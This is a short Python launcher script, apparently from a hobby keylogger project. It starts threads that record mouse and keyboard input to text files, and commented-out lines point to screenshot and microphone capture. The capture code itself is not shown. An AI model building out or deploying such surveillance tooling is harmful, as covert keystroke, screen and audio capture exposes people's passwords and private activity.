from keylogger import Keylogger
#from screenshot import Screenshot
#from miclogger import MicLogger
from threading import Thread


if __name__ == "__main__":
	print("Starting mouse logger !")
	mouse_logger = Keylogger("mouse_log.txt", "keyboard_log.txt")
	print("Mouse logger started !")
	mouse = Thread(target=mouse_logger.start_mouse_listener)
	mouse.start()
	print("Mouse logging !")
	print("Starting keyboard logger !")
	keyboard_logger = Keylogger("mouse_log.txt", "keyboard_log.txt")
	print("Keyboard logger started !")
	keyboard = Thread(target=keyboard_logger.start_listener)
	keyboard.start()
	print("Keyboard logging !")
	#screenshot = Screenshot("Screenshots", 5, "screenshot_log.txt")
	#screenshot.start_screenshoting()
	#mic_logger = MicLogger("mic_log.txt")